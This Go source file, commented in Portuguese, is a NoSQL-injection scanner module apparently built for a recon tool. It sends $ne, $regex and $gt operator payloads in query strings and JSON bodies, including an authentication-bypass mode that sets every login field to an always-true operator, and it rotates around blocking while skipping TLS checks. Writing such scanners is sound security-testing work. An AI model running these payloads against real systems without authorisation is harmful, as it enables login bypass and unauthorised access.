// scan-nosqli — NoSQL injection (injeção de operador estilo MongoDB, OWASP
// A03). Onde o scan-sqli prova vazamento de erro de banco SQL, este prova que
// um operador NoSQL ($ne/$regex/$gt) injetado num parâmetro foi INTERPRETADO
// pelo servidor — não tratado como string literal. Confirma por diferencial
// booleano (mesma disciplina anti-FP do hub): dois controles sempre-falsos têm
// que bater entre si (baseline estável) e o operador sempre-verdadeiro tem que
// divergir. Nunca extrai dado — só observa status+tamanho, e só prova que o
// operador passou (a extração iterativa de registros seria carga/DoS e fica de
// fora de propósito). Dois modos: query (bracket `p[$ne]=` na querystring, estilo
// Express/qs) e json (objeto `{"$ne":...}` no corpo — inclui o bypass de auth
// combinando os campos de login). Contrato NDJSON do recon-hub no stdout.
package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

type payload struct {
	Target string         `json:"target"`
	Params map[string]any `json:"params"`
	JobID  string         `json:"job_id"`
}

type ev struct {
	Type        string         `json:"type"`
	Level       string         `json:"level,omitempty"`
	Msg         string         `json:"msg,omitempty"`
	Kind        string         `json:"kind,omitempty"`
	Value       string         `json:"value,omitempty"`
	Severity    string         `json:"severity,omitempty"`
	FindingType string         `json:"finding_type,omitempty"`
	Title       string         `json:"title,omitempty"`
	Asset       string         `json:"asset,omitempty"`
	Evidence    string         `json:"evidence,omitempty"`
	Meta        map[string]any `json:"meta,omitempty"`
	OK          bool           `json:"ok,omitempty"`
}

var (
	out    = bufio.NewWriter(os.Stdout)
	pretty bool
)

func emit(e ev) {
	if pretty {
		switch e.Type {
		case "finding":
			fmt.Fprintf(out, "[%s] %s\n        %s\n", strings.ToUpper(e.Severity), e.Title, e.Evidence)
		case "done":
			fmt.Fprintln(out, "done: "+e.Msg)
		case "error":
			fmt.Fprintln(out, "erro: "+e.Msg)
		default:
			lv := e.Level
			if lv == "" {
				lv = "info"
			}
			fmt.Fprintf(out, "[%s] %s\n", lv, e.Msg)
		}
	} else {
		b, _ := json.Marshal(e)
		out.Write(b)
		out.WriteByte('\n')
	}
	out.Flush()
}

var (
	client      *http.Client
	paceD       time.Duration
	tolerance   int
	contentType string
	cookie      string
	bearer      string
	method      string
)

func main() {
	var (
		flagTarget = flag.String("target", "", "URL do endpoint a testar (com querystring no modo query, ou o endpoint que recebe JSON no modo json)")
		flagMode   = flag.String("mode", "", "query (injeta operador na querystring) ou json (injeta no corpo JSON). Default: json se body vier, senão query")
		flagParams = flag.String("params", "", "CSV de parâmetros a testar (modo query; default: os que já estão na URL)")
		flagMethod = flag.String("method", "", "método do modo json (POST/PUT/PATCH) — default POST")
		flagBody   = flag.String("body", "", "corpo JSON base legítimo (modo json) — ex: {\"username\":\"x\",\"password\":\"y\"}")
		flagFields = flag.String("fields", "", "CSV de campos do corpo a testar (modo json; default: os campos string do body)")
		flagCType  = flag.String("content-type", "", "Content-Type do corpo (modo json) — default application/json")
		flagCookie = flag.String("cookie", "", "Cookie da sessão de teste")
		flagBearer = flag.String("bearer", "", "Bearer token da sessão de teste")
		flagTol    = flag.Int("tolerance-pct", 0, "tolerância de diferença de tamanho de corpo, em % (0 = param/15)")
		flagPaceMs = flag.Int("pace-ms", 0, "pausa entre requisições em ms (0 = param/300)")
		flagTOms   = flag.Int("timeout-ms", 0, "timeout por requisição (0 = param/10000)")
		flagPretty = flag.Bool("pretty", false, "saída legível")
	)
	flag.Parse()
	pretty = *flagPretty
	defer out.Flush()

	pl := readPayload()
	timeout := time.Duration(pick(*flagTOms, intParam(pl.Params, "timeout_ms"), 10000)) * time.Millisecond
	paceD = time.Duration(pick(*flagPaceMs, intParam(pl.Params, "pace_ms"), 300)) * time.Millisecond
	tolerance = pick(*flagTol, intParam(pl.Params, "tolerance_pct"), 15)

	target := normURL(firstNonEmpty(pl.Target, *flagTarget, os.Getenv("RECONHUB_TARGET")))
	if target == "" {
		emit(ev{Type: "error", Msg: "informe target — a URL do endpoint a testar"})
		os.Exit(2)
	}
	contentType = firstNonEmpty(*flagCType, strParam(pl.Params, "content_type"), "application/json")
	cookie = firstNonEmpty(*flagCookie, strParam(pl.Params, "cookie"), os.Getenv("RECONHUB_PARAM_COOKIE"), os.Getenv("RECONHUB_AUTH_COOKIE"))
	bearer = firstNonEmpty(*flagBearer, strParam(pl.Params, "bearer"), os.Getenv("RECONHUB_PARAM_BEARER"), os.Getenv("RECONHUB_AUTH_BEARER"))
	method = strings.ToUpper(firstNonEmpty(*flagMethod, strParam(pl.Params, "method"), "POST"))

	rawBody := firstNonEmpty(*flagBody, strParam(pl.Params, "body"))
	mode := strings.ToLower(firstNonEmpty(*flagMode, strParam(pl.Params, "mode")))
	if mode == "" {
		if rawBody != "" {
			mode = "json"
		} else {
			mode = "query"
		}
	}

	transport := &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: true,
		DialContext:       (&net.Dialer{Timeout: timeout}).DialContext,
	}
	applyProxy(transport, timeout)
	client = &http.Client{
		Timeout:   timeout,
		Transport: withBlockRotation(transport, func(msg string) { emit(ev{Type: "log", Level: "info", Msg: msg}) }),
	}

	emit(ev{Type: "asset", Kind: "url", Value: target})

	var hits int
	switch mode {
	case "query":
		hits = runQueryMode(target, firstNonEmpty(*flagParams, strParam(pl.Params, "params")))
	case "json":
		hits = runJSONMode(target, rawBody, firstNonEmpty(*flagFields, strParam(pl.Params, "fields")))
	default:
		emit(ev{Type: "error", Msg: "mode deve ser query ou json — recebido: " + mode})
		os.Exit(2)
	}
	emit(ev{Type: "done", OK: true, Msg: fmt.Sprintf("%d ponto(s) de injeção NoSQL confirmado(s)", hits)})
}

// runQueryMode injeta operador via bracket notation (p[$ne]=) em cada parâmetro
// da querystring e confirma por diferencial booleano.
func runQueryMode(target, paramsCSV string) int {
	u, err := url.Parse(target)
	if err != nil {
		emit(ev{Type: "error", Msg: "URL inválida: " + err.Error()})
		return 0
	}
	base := u.Query()
	params := splitCSV(paramsCSV)
	if len(params) == 0 {
		for k := range base {
			params = append(params, k)
		}
	}
	if len(params) == 0 {
		emit(ev{Type: "log", Level: "warn", Msg: "nenhum parâmetro pra testar — passe params=... ou use uma URL com querystring"})
		return 0
	}

	hits := 0
	first := true
	for _, p := range params {
		randA, randB := "rhnq"+randToken(), "rhnq"+randToken()
		// baseline falso estável: dois literais diferentes que não casam
		fa := sendGET(&first, u, litQuery(base, p, randA))
		fb := sendGET(&first, u, litQuery(base, p, randB))
		for _, op := range truthyOperators {
			tr := sendGET(&first, u, opQuery(base, p, op.name, randA))
			if ok, reason := classifyBoolean(fa, fb, tr, tolerance); ok {
				hits++
				emit(ev{
					Type: "finding", Severity: "high", FindingType: "nosql-injection",
					Title:    "NoSQL injection: operador " + op.name + " interpretado no parâmetro `" + p + "` (" + hostOf(target) + ")",
					Asset:    target,
					Evidence: fmt.Sprintf("no parâmetro de query `%s`, injetei `%s[%s]` (bracket notation, estilo Express/qs). %s. Um valor literal no mesmo parâmetro não produziu essa resposta — o servidor interpretou `%s` como operador de consulta NoSQL, não como string.", p, p, op.name, reason, op.name),
					Meta: map[string]any{
						"param": p, "operator": op.name, "mode": "query",
						"truthy_status": tr.status, "truthy_len": tr.length,
						"false_status": fa.status, "false_len": fa.length,
					},
				})
				break // um operador confirmado por parâmetro basta
			}
		}
	}
	return hits
}

// runJSONMode injeta {"$ne":...} nos campos do corpo. Faz (1) o bypass de auth
// combinando TODOS os campos alvo (caso clássico de login) e (2) teste
// por-campo (endpoints de filtro/consulta que recebem JSON).
func runJSONMode(target, rawBody, fieldsCSV string) int {
	base := map[string]any{}
	if rawBody != "" {
		if err := json.Unmarshal([]byte(rawBody), &base); err != nil {
			emit(ev{Type: "error", Msg: "body precisa ser um objeto JSON válido: " + err.Error()})
			os.Exit(2)
		}
	}
	fields := splitCSV(fieldsCSV)
	if len(fields) == 0 {
		for k, v := range base {
			if _, isStr := v.(string); isStr {
				fields = append(fields, k)
			}
		}
	}
	if len(fields) == 0 {
		emit(ev{Type: "log", Level: "warn", Msg: "nenhum campo pra testar — passe fields=... ou um body com campos string"})
		return 0
	}

	hits := 0
	first := true

	// (1) bypass de auth: todos os campos alvo viram operador de uma vez.
	if len(fields) >= 2 {
		randA, randB := "rhnq"+randToken(), "rhnq"+randToken()
		fa := sendJSON(&first, target, litBodyAll(base, fields, randA))
		fb := sendJSON(&first, target, litBodyAll(base, fields, randB))
		for _, op := range truthyOperators {
			tr := sendJSON(&first, target, opBodyAll(base, fields, op.name, randA))
			if ok, reason := classifyBoolean(fa, fb, tr, tolerance); ok {
				hits++
				emit(ev{
					Type: "finding", Severity: "critical", FindingType: "nosql-injection",
					Title:    "NoSQL auth bypass: operador " + op.name + " em " + strings.Join(fields, "+") + " (" + hostOf(target) + ")",
					Asset:    target,
					Evidence: fmt.Sprintf("no corpo JSON, troquei os campos %s por `{\"%s\":...}` de uma vez (sempre-verdadeiro). %s. Credenciais literais erradas nos mesmos campos não produziram essa resposta — o servidor interpretou o operador, autenticando sem credencial válida.", strings.Join(fields, "+"), op.name, reason),
					Meta: map[string]any{
						"fields": strings.Join(fields, ","), "operator": op.name, "mode": "json", "vector": "auth-bypass",
						"truthy_status": tr.status, "truthy_len": tr.length,
						"false_status": fa.status, "false_len": fa.length,
					},
				})
				break
			}
		}
	}

	// (2) por-campo: só esse campo vira operador, os outros mantêm o valor base.
	for _, f := range fields {
		randA, randB := "rhnq"+randToken(), "rhnq"+randToken()
		fa := sendJSON(&first, target, litBodyOne(base, f, randA))
		fb := sendJSON(&first, target, litBodyOne(base, f, randB))
		for _, op := range truthyOperators {
			tr := sendJSON(&first, target, opBodyOne(base, f, op.name, randA))
			if ok, reason := classifyBoolean(fa, fb, tr, tolerance); ok {
				hits++
				emit(ev{
					Type: "finding", Severity: "high", FindingType: "nosql-injection",
					Title:    "NoSQL injection: operador " + op.name + " interpretado no campo `" + f + "` (" + hostOf(target) + ")",
					Asset:    target,
					Evidence: fmt.Sprintf("no corpo JSON, troquei o campo `%s` por `{\"%s\":...}` (sempre-verdadeiro). %s. Um valor literal no mesmo campo não produziu essa resposta — operador NoSQL interpretado, não string.", f, op.name, reason),
					Meta: map[string]any{
						"field": f, "operator": op.name, "mode": "json",
						"truthy_status": tr.status, "truthy_len": tr.length,
						"false_status": fa.status, "false_len": fa.length,
					},
				})
				break
			}
		}
	}
	return hits
}

// --- construção de requisições ---

func litQuery(base url.Values, param, val string) url.Values {
	q := cloneValues(base)
	q.Set(param, val)
	return q
}

func opQuery(base url.Values, param, op, rand string) url.Values {
	q := cloneValues(base)
	q.Del(param)
	q.Set(param+"["+op+"]", opValue(op, rand))
	return q
}

func litBodyOne(base map[string]any, field, val string) map[string]any {
	b := cloneMap(base)
	b[field] = val
	return b
}

func opBodyOne(base map[string]any, field, op, rand string) map[string]any {
	b := cloneMap(base)
	b[field] = map[string]any{op: opJSONValue(op, rand)}
	return b
}

func litBodyAll(base map[string]any, fields []string, val string) map[string]any {
	b := cloneMap(base)
	for _, f := range fields {
		b[f] = val
	}
	return b
}

func opBodyAll(base map[string]any, fields []string, op, rand string) map[string]any {
	b := cloneMap(base)
	for _, f := range fields {
		b[f] = map[string]any{op: opJSONValue(op, rand)}
	}
	return b
}

// opValue é o valor do operador na querystring (string). opJSONValue é o mesmo
// no corpo JSON (tipado). $ne de um valor inexistente casa tudo; $regex ".*"
// casa tudo; $gt "" é > string vazia.
func opValue(op, rand string) string {
	switch op {
	case "$regex":
		return ".*"
	case "$gt":
		return ""
	default: // $ne
		return rand
	}
}

func opJSONValue(op, rand string) any {
	switch op {
	case "$regex":
		return ".*"
	case "$gt":
		return ""
	default: // $ne
		return rand
	}
}

// sendGET/sendJSON aplicam o pacing (pausa antes de cada requisição, menos a
// 1ª) e devolvem só status+tamanho — nunca o corpo, pra não guardar dado real.
func sendGET(first *bool, u *url.URL, q url.Values) probe {
	pace(first)
	cp := *u
	cp.RawQuery = q.Encode()
	req, err := http.NewRequest(http.MethodGet, cp.String(), nil)
	if err != nil {
		return probe{}
	}
	return do(req)
}

func sendJSON(first *bool, target string, body map[string]any) probe {
	pace(first)
	raw, _ := json.Marshal(body)
	req, err := http.NewRequest(method, target, bytes.NewReader(raw))
	if err != nil {
		return probe{}
	}
	req.Header.Set("Content-Type", contentType)
	return do(req)
}

func do(req *http.Request) probe {
	req.Header.Set("User-Agent", "recon-hub/scan-nosqli")
	req.Header.Set("Accept", "application/json")
	if cookie != "" {
		req.Header.Set("Cookie", cookie)
	}
	if bearer != "" {
		req.Header.Set("Authorization", "Bearer "+bearer)
	}
	resp, err := client.Do(req)
	if err != nil {
		return probe{}
	}
	defer resp.Body.Close()
	n, _ := io.Copy(io.Discard, io.LimitReader(resp.Body, 4<<20))
	return probe{status: resp.StatusCode, length: int(n)}
}

func pace(first *bool) {
	if *first {
		*first = false
		return
	}
	time.Sleep(paceD)
}

func hostOf(u string) string {
	if p, err := url.Parse(u); err == nil {
		return strings.ToLower(p.Host)
	}
	return ""
}

func randToken() string {
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return strconv.FormatInt(time.Now().UnixNano(), 16)
	}
	return hex.EncodeToString(b)
}

func cloneValues(v url.Values) url.Values {
	c := make(url.Values, len(v))
	for k, vs := range v {
		c[k] = append([]string(nil), vs...)
	}
	return c
}

func cloneMap(m map[string]any) map[string]any {
	c := make(map[string]any, len(m)+1)
	for k, v := range m {
		c[k] = v
	}
	return c
}

func splitCSV(s string) []string {
	var out []string
	for _, p := range strings.Split(s, ",") {
		if t := strings.TrimSpace(p); t != "" {
			out = append(out, t)
		}
	}
	return out
}

// --- helpers padrão ---

func readPayload() payload {
	var p payload
	fi, err := os.Stdin.Stat()
	if err != nil || (fi.Mode()&os.ModeCharDevice) != 0 {
		return p
	}
	b, _ := io.ReadAll(io.LimitReader(os.Stdin, 1<<20))
	if s := strings.TrimSpace(string(b)); s != "" {
		_ = json.Unmarshal([]byte(s), &p)
	}
	return p
}

func normURL(s string) string {
	s = strings.TrimSpace(s)
	if s == "" {
		return ""
	}
	if !strings.HasPrefix(s, "http://") && !strings.HasPrefix(s, "https://") {
		s = "https://" + s
	}
	if _, err := url.Parse(s); err != nil {
		return ""
	}
	return s
}

func firstNonEmpty(vs ...string) string {
	for _, v := range vs {
		if t := strings.TrimSpace(v); t != "" {
			return t
		}
	}
	return ""
}

func strParam(m map[string]any, k string) string { s, _ := m[k].(string); return s }

func intParam(m map[string]any, k string) int {
	switch v := m[k].(type) {
	case float64:
		return int(v)
	case int:
		return v
	case string:
		n, _ := strconv.Atoi(v)
		return n
	}
	return 0
}

func pick(vs ...int) int {
	for _, v := range vs {
		if v > 0 {
			return v
		}
	}
	if len(vs) > 0 {
		return vs[len(vs)-1]
	}
	return 0
}
